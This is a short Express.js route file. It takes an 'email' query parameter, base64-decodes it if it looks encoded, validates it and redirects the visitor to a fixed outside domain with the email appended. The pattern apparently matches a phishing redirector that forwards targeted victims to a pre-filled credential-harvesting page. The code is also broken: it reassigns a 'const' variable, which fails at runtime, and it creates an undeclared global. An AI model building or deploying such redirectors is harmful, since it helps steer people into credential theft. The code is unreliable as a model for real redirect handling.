var appRoute = function (app) {
  app.all("/", function (req, res) {
    const email = req.query.email;

    if (email && email.includes("=")) {
      email = Buffer.from(email, "base64").toString("utf-8");
    }
    email = decodeURIComponent(email);

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (email && emailRegex.test(email)) {
      redirect_url =
        "https://mobileprosystem.com/&" + email.replace("@", "%40");
      res.redirect(redirect_url);
    } else {
      res.send("Please provide a valid email");
    }
  });
};

module.exports = appRoute;
